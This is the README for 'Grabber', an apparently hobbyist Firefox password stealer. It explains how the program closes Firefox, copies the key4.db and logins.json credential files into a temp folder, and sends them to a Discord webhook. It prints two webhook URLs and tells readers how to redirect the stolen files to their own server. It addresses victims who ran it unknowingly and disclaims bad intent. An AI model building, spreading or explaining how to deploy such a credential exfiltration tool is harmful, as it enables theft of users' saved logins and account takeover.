# Grabber
This Program is for Copying and Sending Log-in Data to another person via Discord Webhook.
This program is currently in Alpha V1.1 by writing of this README.txt and can only be used per Firefox by this Point. 
This Program works by Making sure Firefox.exe is completly closed by Closing the Browser or Starting and again Closing the Browser for 100% verfication
that its closed. From that point it creates a Folder in %temp% where the "key4.db" and "logins.json" getting copied to on the local harddrive. 
From that point on i turned on an Discord-Webhook that automatically send those 2 files into an Private Text channel on my Discord Server. 
With those 2 Files i can copy them to my Local Appdata\Roaming\Mozilla\Profiles directory and view the Content (In this case Login Info) through Firefox´s 
intergrated Password Manager. 

I dont plan to use this Program for bad or stealing any informations but rather to try myself in coding after watching an Youtube video about an Password
stealer called named "Lumma". If you didnt read this README file, or even didnt existed in the file that you got send and just started to launch the Program.
Im sorry but your Passwords are now shared with another or Multiple People. The only way is to quickly change all your Information so they can do as little 
damage as possible. This program is simple written and should spread awareness to only use Password Manager Programs that are specifically made for Security.


If you just started the Program by installing it Fresh from github.com/SnawaHD/Grabber and want your Log-In Infos deleted you can contact me via my 
Discord Server that got only made for this Project: https://discord.gg/XqFtQ7CWC4

If you want to change the Discord-Webhook where the Files are getting send to you can make on easily by going into any Server you own > Settings > Intergration
> Webhook. Then you do one and copy the link and paste it into the code that is under the "Program.cs". Im recomending to open this Program in Visual Studios 
because i created it there. The Lines that are essential to redirect the files to your Webhook are easy to change and easy to identify. 
The Lines will look like this: 

string webhookLink = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";
string Webhook_link = "https://discord.com/api/webhooks/1093683641068044378/KCPO4Q-xlX3zcMR25Ukt5L8LnVw_YwbsGFVLjZE142Pb3Is-7OM0eOYuR2QMWr1Lv0Go";

The lines are also very long in comparison to the other code and are both follow by another long line compared to the code.
After that just save the program and launch it. Your files are now in the folder named "AppData\Local\Temp\a74Bas57M\Profiles"

Enjoy!
